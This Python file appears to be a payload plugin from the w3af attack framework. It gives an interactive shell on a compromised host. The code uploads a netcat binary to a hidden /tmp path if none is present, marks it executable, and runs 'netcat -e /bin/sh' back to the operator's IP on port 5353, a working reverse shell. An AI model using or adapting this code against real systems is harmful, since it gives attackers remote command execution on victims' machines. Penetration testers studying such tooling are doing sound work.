from plugins.attack.payloads.base_payload import base_payload
from core.ui.consoleUi.tables import table
import core.controllers.outputManager as om
import time
from core.controllers.misc.get_local_ip import get_local_ip


class netcat_interactive_shell(base_payload):
    '''
    This payload runs netcat in the remote host and establishes an interactive shell.
    '''
    def api_execute(self):

        netcat_result = self.exec_payload('netcat_installed')

        if netcat_result['netcat_installed'] and netcat_result['supports_shell_bind']:
            #
            #    No need to upload my own version of netcat, the remote host
            #    already has a "vulnerable" version installed.
            #
            netcat_path = netcat_result['path']

        else:
            #
            #    I need to upload my version of netcat
            # 
            netcat_path = '/tmp/.netcat.w3af'
            local_netcat = 'plugins/attack/payloads/code/netcat'
            
            upload_res = self.shell.upload(local_netcat, netcat_path)
            if 'success' not in upload_res.lower():
                return 'Failed to upload netcat file.'
            
            self.shell.execute('chmod +x ' + netcat_path ) 
        
        return self.run_netcat( netcat_path )
            
    def run_netcat(self, netcat_path):
        '''
        @return: A message to show to the user. A new shell object is created and stored
        in the kb.
        '''
        om.out.console('Please run the following command in your box:')
        om.out.console('netcat -v -l 5353')
        time.sleep(60)
        
        my_ip_address = get_local_ip()
        
        netcat_command = '%s -e /bin/sh %s 5353' % (netcat_path, my_ip_address)
        
        self.shell.execute( netcat_command )
        
        om.out.console('You should have an interactive shell, w00t!')
        
        return True
    
    def run_execute(self):
        api_result = self.api_execute()
        return api_result

